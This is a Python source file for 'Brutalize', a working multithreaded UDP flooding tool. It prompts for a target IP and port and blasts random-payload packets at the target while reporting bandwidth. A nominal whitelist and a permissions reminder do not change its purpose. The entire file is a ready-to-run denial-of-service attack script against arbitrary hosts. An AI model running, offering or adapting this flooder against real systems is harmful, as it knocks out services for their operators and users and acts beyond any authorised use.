import re
import logging
import configparser
import os
from socket import socket, AF_INET, SOCK_DGRAM, error as SocketError
from threading import Thread, Lock
from random import randint, choice
from time import time, sleep
from string import ascii_letters, digits

# Initialize logging
logging.basicConfig(filename="brutalize.log", level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class Brutalize:
    def __init__(self, ip, port, force, threads, rate_limit=None):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads
        self.rate_limit = rate_limit
        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.lock = Lock()
        self.on = False
        self.threads_list = []
        self.packets_sent = 0

    def _generate_payload(self):
        """Generate a dynamic payload consisting of random characters."""
        return str.encode(''.join(choice(ascii_letters + digits) for _ in range(self.force)))

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            t = Thread(target=self.send)
            t.start()
            self.threads_list.append(t)
        Thread(target=self.info).start()

    def info(self):
        interval = 0.05
        now = time()
        size = 0
        self.total = 0
        bytediff = 8
        mb = 1000000
        gb = 1000000000
        while self.on:
            sleep(interval)
            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(f"{round(size)} Mb/s - Total: {round(self.total, 1)} Gb. {' '*20}", end='\r')
            now2 = time()
            if now + 1 >= now2:
                continue
            size = round(self.sent * bytediff / mb)
            self.sent = 0
            now += 1

    def stop(self):
        self.on = False
        for thread in self.threads_list:
            thread.join()

    def send(self):
        while self.on:
            if self.rate_limit:
                with self.lock:
                    if self.packets_sent >= self.rate_limit:
                        sleep(1)
                        self.packets_sent = 0
            try:
                self.client.sendto(self._generate_payload(), self._randaddr())
                self.sent += self.force
                with self.lock:
                    self.packets_sent += 1
            except SocketError as e:
                print(f"Socket error: {e}")
            except Exception as e:
                print(f"Error sending packet: {e}")

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

class EnhancedBrutalize(Brutalize):
    WHITELIST = []  # IPs that should never be attacked

    def flood(self):
        if self.ip in self.WHITELIST:
            print(f"Error: IP {self.ip} is whitelisted. Aborting attack.")
            logging.error(f"Attempted to attack whitelisted IP: {self.ip}")
            return

        super().flood()

    def send(self):
        while self.on:
            if self.rate_limit:
                with self.lock:
                    if self.packets_sent >= self.rate_limit:
                        logging.warning(f"Rate limit reached: {self.rate_limit} packets/s")
                        sleep(1)
                        self.packets_sent = 0
            try:
                self.client.sendto(self._generate_payload(), self._randaddr())
                self.sent += self.force
                with self.lock:
                    self.packets_sent += 1
            except SocketError as e:
                logging.error(f"Socket error: {e}")
                print(f"Socket error: {e}")
            except Exception as e:
                logging.error(f"Error sending packet: {e}")
                print(f"Error sending packet: {e}")

def load_config():
    config = configparser.ConfigParser()
    if os.path.exists('config.ini'):
        config.read('config.ini')
        EnhancedBrutalize.WHITELIST = config.get("DEFAULT", "whitelist").split(",")
    return config

def save_config(config):
    with open('config.ini', 'w') as configfile:
        config.write(configfile)

def display_help():
    help_text = """
    Brutalize Help:
    - Ensure you have the necessary permissions before launching any attack.
    - IP: Target IP address to attack.
    - Port: Specific port to attack. Leave empty to attack all ports.
    - Bytes per packet: Size of each packet. Default is 1250 bytes.
    - Threads: Number of threads to use for the attack. Default is 100 threads.
    - Rate limit: Maximum packets per second. Leave empty for no limit.
    """
    print(help_text)

def validate_ip(ip):
    pattern = re.compile(r"^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})(\.(25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})){3}$")
    return bool(pattern.match(ip))

def enhanced_main():
    config = load_config()

    ip = input("Enter the IP to Brutalize (or 'help' for assistance): ")
    if ip.lower() == 'help':
        display_help()
        return
    if not validate_ip(ip):
        print("Error! Please enter a correct IP address.")
        logging.error(f"Invalid IP entered: {ip}")
        return

    port = input("Enter port [press enter to attack all ports]: ")
    if port == '':
        port = None
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                raise ValueError
        except ValueError:
            print("Error! Please enter a correct port.")
            logging.error(f"Invalid port entered: {port}")
            return

    force = input("Bytes per packet [press enter for 1250]: ")
    if force == '':
        force = 1250
    else:
        try:
            force = int(force)
        except ValueError:
            print("Error! Please enter an integer.")
            logging.error(f"Invalid packet size entered: {force}")
            return

    threads = input("Threads [press enter for 100]: ")
    if threads == '':
        threads = 100
    else:
        try:
            threads = int(threads)
        except ValueError:
            print("Error! Please enter an integer.")
            logging.error(f"Invalid thread count entered: {threads}")
            return

    rate_limit = input("Max packets per second (rate limit) [press enter for no limit]: ")
    if rate_limit == '':
        rate_limit = None
    else:
        try:
            rate_limit = int(rate_limit)
        except ValueError:
            print("Error! Please enter an integer.")
            logging.error(f"Invalid rate limit entered: {rate_limit}")
            return

    cport = '' if port is None else f':{port}'
    print(f"Starting attack on {ip}{cport}.", end='\r')
    brute = EnhancedBrutalize(ip, port, force, threads, rate_limit)
    try:
        brute.flood()
    except:
        brute.stop()
        print("A fatal error has occurred and the attack was stopped.")
    try:
        while brute.on:
            sleep(1)
    except KeyboardInterrupt:
        brute.stop()
        print(f"\nAttack stopped. {ip}{cport} was Brutalized with {round(brute.total, 1)} Gb.", '.')

    input("Press enter to exit.")
